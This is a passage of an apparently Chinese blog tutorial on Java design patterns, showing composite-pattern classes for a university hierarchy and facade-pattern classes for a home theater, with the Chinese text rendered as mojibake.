<span class="hljs-title function_">College</span><span class="hljs-params">(String name, String des)</span> &#123;<br>      <span class="hljs-built_in">super</span>(name, des);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>   &#125;<br><br>   <span class="hljs-comment">// é‡å†™add</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//  å°†æ¥å®é™…ä¸šåŠ¡ä¸­ï¼ŒColleage çš„ add å’Œ  University add ä¸ä¸€å®šå®Œå…¨ä¸€æ ·</span><br>      organizationComponents.add(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-comment">// é‡å†™remove</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      organizationComponents.remove(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getName();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getDes();<br>   &#125;<br><br>   <span class="hljs-comment">// printæ–¹æ³•ï¼Œå°±æ˜¯è¾“å‡ºUniversity åŒ…å«çš„å­¦é™¢</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span> + getName() + <span class="hljs-string">&quot;--------------&quot;</span>);<br>      <span class="hljs-comment">//éå† organizationComponents </span><br>      <span class="hljs-keyword">for</span> (OrganizationComponent organizationComponent : organizationComponents) &#123;<br>         organizationComponent.print();<br>      &#125;<br>   &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>University</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//University å°±æ˜¯ Composite , å¯ä»¥ç®¡ç†College</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">University</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>   List&lt;OrganizationComponent&gt; organizationComponents = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;OrganizationComponent&gt;();<br><br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">University</span><span class="hljs-params">(String name, String des)</span> &#123;<br>      <span class="hljs-built_in">super</span>(name, des);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>   &#125;<br><br>   <span class="hljs-comment">// é‡å†™add</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      organizationComponents.add(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-comment">// é‡å†™remove</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      organizationComponents.remove(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getName();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getDes();<br>   &#125;<br><br>   <span class="hljs-comment">// printæ–¹æ³•ï¼Œå°±æ˜¯è¾“å‡ºUniversity åŒ…å«çš„å­¦é™¢</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span> + getName() + <span class="hljs-string">&quot;--------------&quot;</span>);<br>      <span class="hljs-comment">//éå† organizationComponents </span><br>      <span class="hljs-keyword">for</span> (OrganizationComponent organizationComponent : organizationComponents) &#123;<br>         organizationComponent.print();<br>      &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>      <span class="hljs-comment">//ä»å¤§åˆ°å°åˆ›å»ºå¯¹è±¡ å­¦æ ¡</span><br>      <span class="hljs-type">OrganizationComponent</span> <span class="hljs-variable">university</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">University</span>(<span class="hljs-string">&quot;æ¸…åå¤§å­¦&quot;</span>, <span class="hljs-string">&quot; ä¸­å›½é¡¶çº§å¤§å­¦ &quot;</span>);<br>      <br>      <span class="hljs-comment">//åˆ›å»º å­¦é™¢</span><br>      <span class="hljs-type">OrganizationComponent</span> <span class="hljs-variable">computerCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">College</span>(<span class="hljs-string">&quot;è®¡ç®—æœºå­¦é™¢&quot;</span>, <span class="hljs-string">&quot; è®¡ç®—æœºå­¦é™¢ &quot;</span>);<br>      <span class="hljs-type">OrganizationComponent</span> <span class="hljs-variable">infoEngineercollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">College</span>(<span class="hljs-string">&quot;ä¿¡æ¯å·¥ç¨‹å­¦é™¢&quot;</span>, <span class="hljs-string">&quot; ä¿¡æ¯å·¥ç¨‹å­¦é™¢ &quot;</span>);<br>      <br>      <br>      <span class="hljs-comment">//åˆ›å»ºå„ä¸ªå­¦é™¢ä¸‹é¢çš„ç³»(ä¸“ä¸š)</span><br>      computerCollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;è½¯ä»¶å·¥ç¨‹&quot;</span>, <span class="hljs-string">&quot; è½¯ä»¶å·¥ç¨‹ä¸é”™ &quot;</span>));<br>      computerCollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;ç½‘ç»œå·¥ç¨‹&quot;</span>, <span class="hljs-string">&quot; ç½‘ç»œå·¥ç¨‹ä¸é”™ &quot;</span>));<br>      computerCollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯&quot;</span>, <span class="hljs-string">&quot; è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯æ˜¯è€ç‰Œçš„ä¸“ä¸š &quot;</span>));<br>      <br>      <span class="hljs-comment">//</span><br>      infoEngineercollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;é€šä¿¡å·¥ç¨‹&quot;</span>, <span class="hljs-string">&quot; é€šä¿¡å·¥ç¨‹ä¸å¥½å­¦ &quot;</span>));<br>      infoEngineercollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;ä¿¡æ¯å·¥ç¨‹&quot;</span>, <span class="hljs-string">&quot; ä¿¡æ¯å·¥ç¨‹å¥½å­¦ &quot;</span>));<br>      <br>      <span class="hljs-comment">//å°†å­¦é™¢åŠ å…¥åˆ° å­¦æ ¡</span><br>      university.add(computerCollege);<br>      university.add(infoEngineercollege);<br><br>      university.print();<br>      System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~~~~~~~~&quot;</span>);<br>      infoEngineercollege.print();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">----------------------æ¸…åå¤§å­¦----------------------<br>--------------è®¡ç®—æœºå­¦é™¢--------------<br>è½¯ä»¶å·¥ç¨‹<br>ç½‘ç»œå·¥ç¨‹<br>è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯<br>--------------ä¿¡æ¯å·¥ç¨‹å­¦é™¢--------------<br>é€šä¿¡å·¥ç¨‹<br><span class="hljs-section">ä¿¡æ¯å·¥ç¨‹</span><br><span class="hljs-section">~~~~~~~~~~~~~~~~~~~~</span><br>--------------ä¿¡æ¯å·¥ç¨‹å­¦é™¢--------------<br>é€šä¿¡å·¥ç¨‹<br>ä¿¡æ¯å·¥ç¨‹<br></code></pre></td></tr></table></figure><h2 id="ç»„åˆæ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#ç»„åˆæ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> ç»„åˆæ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>ç®€åŒ–å®¢æˆ·ç«¯æ“ä½œã€‚å®¢æˆ·ç«¯åªéœ€è¦é¢å¯¹ä¸€è‡´çš„å¯¹è±¡è€Œä¸ç”¨è€ƒè™‘æ•´ä½“éƒ¨åˆ†æˆ–è€…èŠ‚ç‚¹å¶å­çš„é—®é¢˜ã€‚</p></li><li><p>å…·æœ‰è¾ƒå¼ºçš„æ‰©å±•æ€§ã€‚å½“æˆ‘ä»¬è¦æ›´æ”¹ç»„åˆå¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒæ•´å†…éƒ¨çš„å±‚æ¬¡å…³ç³»ï¼Œå®¢æˆ·ç«¯ä¸ç”¨åšå‡ºä»»ä½•æ”¹åŠ¨.</p></li><li><p>æ–¹ä¾¿åˆ›å»ºå‡ºå¤æ‚çš„å±‚æ¬¡ç»“æ„ã€‚å®¢æˆ·ç«¯ä¸ç”¨ç†ä¼šç»„åˆé‡Œé¢çš„ç»„æˆç»†èŠ‚ï¼Œå®¹æ˜“æ·»åŠ èŠ‚ç‚¹æˆ–è€…å¶å­ä»è€Œåˆ›å»ºå‡ºå¤æ‚çš„æ ‘å½¢ç»“æ„</p></li><li><p>éœ€<strong>è¦éå†ç»„ç»‡æœºæ„ï¼Œæˆ–è€…å¤„ç†çš„å¯¹è±¡å…·æœ‰æ ‘å½¢ç»“æ„æ—¶</strong>, éå¸¸<strong>é€‚åˆä½¿ç”¨ç»„åˆæ¨¡å¼</strong>.</p></li><li><p>è¦æ±‚è¾ƒé«˜çš„æŠ½è±¡æ€§ï¼Œå¦‚æœ<strong>èŠ‚ç‚¹å’Œå¶å­æœ‰å¾ˆå¤šå·®å¼‚æ€§çš„è¯</strong>ï¼Œæ¯”å¦‚å¾ˆå¤šæ–¹æ³•å’Œå±æ€§éƒ½ä¸ä¸€æ ·**ï¼Œä¸é€‚åˆä½¿ç”¨ç»„åˆæ¨¡**å¼</p></li></ol><h1 id="å¤–è§‚æ¨¡å¼"><a class="markdownIt-Anchor" href="#å¤–è§‚æ¨¡å¼"></a> å¤–è§‚æ¨¡å¼</h1><p>å¤–è§‚æ¨¡å¼ï¼ˆFacadePatternï¼‰éšè—ç³»ç»Ÿçš„å¤æ‚æ€§ï¼Œå¹¶å‘å®¢æˆ·ç«¯æä¾›äº†ä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥è®¿é—®ç³»ç»Ÿçš„æ¥å£ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒå‘ç°æœ‰çš„ç³»ç»Ÿæ·»åŠ ä¸€ä¸ªæ¥å£ï¼Œæ¥éšè—ç³»ç»Ÿçš„å¤æ‚æ€§ã€‚</p><p>ä¹Ÿå«é—¨é¢æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-9"><a class="markdownIt-Anchor" href="#ä»‹ç»-9"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ï¼Œå¤–è§‚æ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> é™ä½è®¿é—®å¤æ‚ç³»ç»Ÿçš„å†…éƒ¨å­ç³»ç»Ÿæ—¶çš„å¤æ‚åº¦ï¼Œç®€åŒ–å®¢æˆ·ç«¯ä¹‹é—´çš„æ¥å£ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> 1ã€å®¢æˆ·ç«¯ä¸éœ€è¦çŸ¥é“ç³»ç»Ÿå†…éƒ¨çš„å¤æ‚è”ç³»ï¼Œæ•´ä¸ªç³»ç»Ÿåªéœ€æä¾›ä¸€ä¸ª&quot;æ¥å¾…å‘˜&quot;å³å¯ã€‚ 2ã€å®šä¹‰ç³»ç»Ÿçš„å…¥å£ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å®¢æˆ·ç«¯ä¸ä¸ç³»ç»Ÿè€¦åˆï¼Œå¤–è§‚ç±»ä¸ç³»ç»Ÿè€¦åˆã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> åœ¨å®¢æˆ·ç«¯å’Œå¤æ‚ç³»ç»Ÿä¹‹é—´å†åŠ ä¸€å±‚ï¼Œè¿™ä¸€å±‚å°†è°ƒç”¨é¡ºåºã€ä¾èµ–å…³ç³»ç­‰å¤„ç†å¥½ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€å»åŒ»é™¢çœ‹ç—…ï¼Œå¯èƒ½è¦å»æŒ‚å·ã€é—¨è¯Šã€åˆ’ä»·ã€å–è¯ï¼Œè®©æ‚£è€…æˆ–æ‚£è€…å®¶å±è§‰å¾—å¾ˆå¤æ‚ï¼Œå¦‚æœæœ‰æä¾›æ¥å¾…äººå‘˜ï¼Œåªè®©æ¥å¾…äººå‘˜æ¥å¤„ç†ï¼Œå°±å¾ˆæ–¹ä¾¿ã€‚<br />2ã€JAVA çš„ä¸‰å±‚å¼€å‘æ¨¡å¼ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€å‡å°‘ç³»ç»Ÿç›¸äº’ä¾èµ–ã€‚ 2ã€æé«˜çµæ´»æ€§ã€‚ 3ã€æé«˜äº†å®‰å…¨æ€§ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> ä¸ç¬¦åˆå¼€é—­åŸåˆ™ï¼Œå¦‚æœè¦æ”¹ä¸œè¥¿å¾ˆéº»çƒ¦ï¼Œç»§æ‰¿é‡å†™éƒ½ä¸åˆé€‚ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€ä¸ºå¤æ‚çš„æ¨¡å—æˆ–å­ç³»ç»Ÿæä¾›å¤–ç•Œè®¿é—®çš„æ¨¡å—ã€‚ 2ã€å­ç³»ç»Ÿç›¸å¯¹ç‹¬ç«‹ã€‚ 3ã€é¢„é˜²ä½æ°´å¹³äººå‘˜å¸¦æ¥çš„é£é™©ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> åœ¨å±‚æ¬¡åŒ–ç»“æ„ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¤–è§‚æ¨¡å¼å®šä¹‰ç³»ç»Ÿä¸­æ¯ä¸€å±‚çš„å…¥å£ã€‚</p><p><strong>å¤–è§‚æ¨¡å¼åŸç†ç±»å›¾:</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102193340583.png" alt="image-20230102193340583" /></p><p>å¯¹ç±»å›¾è¯´æ˜(åˆ†ç±»å¤–è§‚æ¨¡å¼çš„è§’è‰²)</p><ol><li><p>å¤–è§‚ç±»(Facade): ä¸ºè°ƒç”¨ç«¯á¨€ ä¾›ç»Ÿä¸€çš„è°ƒç”¨æ¥å£, å¤–è§‚ç±»çŸ¥é“å“ªäº›å­ç³»ç»Ÿè´Ÿè´£å¤„ç†è¯·æ±‚,ä»è€Œå°†è°ƒç”¨ç«¯çš„è¯·æ±‚ä»£ç†ç»™é€‚å½“å­ç³»ç»Ÿå¯¹è±¡</p></li><li><p>è°ƒç”¨è€…(Client): å¤–è§‚æ¥å£çš„è°ƒç”¨è€…</p></li><li><p>å­ç³»ç»Ÿçš„é›†åˆï¼šæŒ‡æ¨¡å—æˆ–è€…å­ç³»ç»Ÿï¼Œå¤„ç† Facade å¯¹è±¡æŒ‡æ´¾çš„ä»»åŠ¡ï¼Œä»–æ˜¯åŠŸèƒ½çš„å®é™…<strong>ä¾›è€…</strong></p></li></ol><h2 id="å®ç°-7"><a class="markdownIt-Anchor" href="#å®ç°-7"></a> å®ç°</h2><p>ç»„å»ºä¸€ä¸ªå®¶åº­å½±é™¢ï¼š</p><p>DVDæ’­æ”¾å™¨ã€æŠ•å½±ä»ªã€è‡ªåŠ¨å±å¹•ã€ç¯ç»•ç«‹ä½“å£°ã€çˆ†ç±³èŠ±æœº,è¦æ±‚å®Œæˆä½¿ç”¨å®¶åº­å½±é™¢çš„åŠŸèƒ½ï¼Œå…¶è¿‡ç¨‹ä¸ºï¼š</p><p>ç›´æ¥ç”¨é¥æ§å™¨ï¼šç»Ÿç­¹å„è®¾å¤‡å¼€å…³</p><p>å¼€çˆ†ç±³èŠ±æœº</p><p>æ”¾ä¸‹å±å¹•</p><p>å¼€æŠ•å½±ä»ª</p><p>å¼€éŸ³å“</p><p>å¼€DVDï¼Œé€‰dvd</p><p>å»æ‹¿çˆ†ç±³èŠ±</p><p>è°ƒæš—ç¯å…‰</p><p>æ’­æ”¾</p><p>è§‚å½±ç»“æŸåï¼Œå…³é—­å„ç§è®¾å¤‡</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102193600188.png" alt="image-20230102193600188" /></p><p><code>HomeTheaterFacade</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeTheaterFacade</span> &#123;<br>   <br>   <span class="hljs-comment">//å®šä¹‰å„ä¸ªå­ç³»ç»Ÿå¯¹è±¡</span><br>   <span class="hljs-keyword">private</span> TheaterLight theaterLight;<br>   <span class="hljs-keyword">private</span> Popcorn popcorn;<br>   <span class="hljs-keyword">private</span> Stereo stereo;<br>   <span class="hljs-keyword">private</span> Projector projector;<br>   <span class="hljs-keyword">private</span> Screen screen;<br>   <span class="hljs-keyword">private</span> DVDPlayer dVDPlayer;<br>   <br>   <br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">HomeTheaterFacade</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.theaterLight = TheaterLight.getInstance();<br>      <span class="hljs-built_in">this</span>.popcorn = Popcorn.getInstance();<br>      <span class="hljs-built_in">this</span>.stereo = Stereo.getInstance();<br>      <span class="hljs-built_in">this</span>.projector = Projector.getInstance();<br>      <span class="hljs-built_in">this</span>.screen = Screen.getInstance();<br>      <span class="hljs-built_in">this</span>.dVDPlayer = DVDPlayer.getInstanc();<br>   &#125;<br><br>   <span class="hljs-comment">//æ“ä½œåˆ†æˆ 4 æ­¥</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ready</span><span class="hljs-params">()</span> &#123;<br>      popcorn.on();<br>      popcorn.pop();<br>      screen.down();<br>      projector.on();<br>      stereo.on();<br>      dVDPlayer.on();<br>      theaterLight.dim();<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>      dVDPlayer.play();<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pause</span><span class="hljs-params">()</span> &#123;<br>      dVDPlayer.pause();<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">end</span><span class="hljs-params">()</span> &#123;<br>      popcorn.off();<br>      theaterLight.bright();<br>      screen.up();<br>      projector.off();<br>      stereo.off();<br>      dVDPlayer.off();<br>   &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>DVDPlayer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DVDPlayer</span> &#123;<br>   <br>   <span class="hljs-comment">//ä½¿ç”¨å•ä¾‹æ¨¡å¼, ä½¿ç”¨é¥¿æ±‰å¼</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">DVDPlayer</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DVDPlayer</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DVDPlayer <span class="hljs-title function_">getInstanc</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd on &quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd off &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd is playing &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//....</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pause</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd pause ..&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Popcorn</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Popcorn</span> &#123;<br>   <br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Popcorn</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Popcorn</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Popcorn <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span 